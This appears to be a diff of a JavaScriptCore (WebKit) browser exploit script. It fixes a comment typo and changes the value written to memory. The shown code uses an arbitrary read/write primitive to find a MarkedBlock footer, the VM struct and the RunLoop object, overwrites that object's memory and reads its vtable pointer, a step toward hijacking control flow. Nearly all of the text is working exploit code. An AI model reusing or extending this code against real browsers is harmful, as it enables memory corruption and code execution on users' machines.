@@ -629,7 +629,7 @@ for (var i = 0; i < 1000; ++i) {
         print("object address @ " + hex1(bbaddr));
         var footeraddr = ((bbaddr & 0xffffc000) + (((bbaddr/0x100000000)|0)*0x100000000)+0x4000-0x130) 
         //refer to VM.h this is
-        //JSC::MarkedBlock::footer at 0ffset 8 should be the vm struct
+        //JSC::MarkedBlock::footer at offset 8 should be the vm struct
         print("footeraddr @ " + hex1(footeraddr));
         var vmstruct = stage2.read64(footeraddr+0x08); 
         print("vmstruct @ " + hex1(vmstruct));
@@ -637,7 +637,7 @@ for (var i = 0; i < 1000; ++i) {
         var m_runloop = stage2.read64(vmstruct+0x10); 
         //Ref <WTF::RunLoop> m_runLoop; at offset 0x10-0x18 proceeded by m_random
         print("m_runloop @ " + hex1(m_runloop));
-	stage2.write64(m_runloop,0x41414141);
+	stage2.write64(m_runloop,0x5151515151);
         //at offset 0 of m_runloop should be a vtable  :) should sit within the shared cache
         var vtable = stage2.read64(m_runloop);
         print("vtable @ " + hex1(vtable));
